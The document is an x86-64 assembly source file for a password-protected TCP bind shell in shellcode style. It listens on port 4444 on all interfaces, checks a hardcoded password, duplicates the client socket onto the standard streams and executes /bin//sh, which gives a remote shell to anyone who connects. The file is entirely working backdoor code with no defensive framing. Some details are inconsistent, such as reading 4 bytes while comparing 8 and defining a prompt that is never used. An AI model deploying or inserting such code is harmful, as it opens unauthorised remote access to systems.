; =================================================
;   TCP Bind Shell
; =================================================

global _start

    ; Syscall numbers
    syscalls.socket equ 0x29
    syscalls.bind   equ 0x31
    syscalls.listen equ 0x32
    syscalls.accept equ 0x2b
    syscalls.close  equ 0x03
    syscalls.dup2   equ 0x21
    syscalls.write  equ 0x01
    syscalls.read   equ 0x00
    syscalls.execve equ 0x3b

    ; Constant definitions
    ipv4    equ 0x02            ; AF_INET
    ipv4.addressLen equ 0x10 
    tcp     equ 0x01            ; SOCK_STREAM

    ; Standard streams
    standardIO.in   equ 0x00
    standardIO.out  equ 0x01
    standardIO.err  equ 0x02

    setup.port      equ 0x5c11 ; 4444

    ;:> echo -n '//bin/sh' | rev | xxd
    ;:  00000000: 6873 2f6e 6962 2f2f hs/nib//
    binshString     equ 0x68732f6e69622f2f

    ;:> echo -n '>>pass?:' | rev | xxd
    ;: 00000000: 3a3f 7373 6170 3e3e :?ssap>>
    passPromptString    equ 0x3a3f737361703e3e

    ; Configs
    config.max_cons equ 0x2
    config.password equ 0x4444444444444444 ; DDDDDDDD

section .text

_start:

    xor r14, r14    ; zero out r14 for future repetitive use

    ; 1 - Create socket (socket syscall)
    ;   > man 2 socket
    ;   int socket(int domain, int type, int protocol);
    ;   domain can be AF_INET (ipv4) or AF_INET6 (ipv6)
    ;   type can be SOCK_STREAM (tcp) or SOCK_DGRAM (udp)
    ;   returns the socket file descriptorq
    ;   syscall number is 0x29
    push syscalls.socket
    pop rax
    push ipv4
	pop rdi
    push tcp
	pop rsi
	cdq         ; edx = 0
	syscall

    ; 2 - Save socket fd and build server struct
    mov rdi, rax    ; copy socket descriptor to rdi for later
	
    sub rsp, 8
	mov dword [rsp+4], r14d         ; server.sin_addr.s_addr = INADDR_ANY = 0x00
    mov word  [rsp+2], setup.port   ; server.sin_port = htons(PORT)
    lea rax,  [r14+0x02]
	mov word  [rsp], ax             ; server.sin_family = AF_INET (2)

    ; 3 - Bind to socket
    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	push syscalls.bind
    pop rax
	mov rsi, rsp
    push ipv4.addressLen
	pop rdx
	syscall

    ; 4 - Listen
	; listen(sock, MAX_CLIENTS)
	push syscalls.listen
    pop rax
    push config.max_cons
	pop rsi
	syscall

    ; 5 - Accept incoming connection
	; accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	push syscalls.accept
    pop rax
	sub rsp, 16
	mov rsi, rsp
    mov byte [rsp-1], ipv4.addressLen
    sub rsp, 1
    mov rdx, rsp
    syscall

    ; 6 - Handle incoming connection
	
    ; 6.1 - Save client fd and close parent fd
    mov r9, rax             ; store the client socket fd into r9
        ; This part is not mandatory, may be commented out to save some space
        push syscalls.close
        pop rax                 ; close parent
        syscall

    ; 6.2 - Read password from the client fd
    read_pass:
        mov rax, r14    ; read syscall == 0x00
        mov rdi, r9     ; from client fd
        push 4
        pop rdx         ; rdx = input size
        sub rsp, rdx
        mov rsi, rsp    ; rsi => buffer
        syscall

    ; 6.3 - Check password
        mov rax, config.password
        mov rdi, rsi
        scasq
    jne read_pass

    ; 7 - Duplicate sockets for the new connection one by one
    push standardIO.err
    pop r15
    loop_through_stdfds:
        mov rdi, r9
        push syscalls.dup2
        pop rax
        mov rsi, r15
        syscall
    dec r15
    jns loop_through_stdfds

    ; 9 - Execve
    mov rdx, r14

    push r14 ; First NULL push    
    mov rbx, binshString ; push /bin//sh in reverse
    push rbx     ; store /bin//sh address in RDI
    mov rdi, rsp 
    
    push r14 ; Second NULL push
    mov rdx, rsp
    push rdi     ; set RSI to address of /bin//sh
    mov rsi, rsp
    
    push syscalls.execve
    pop rax
    
    syscall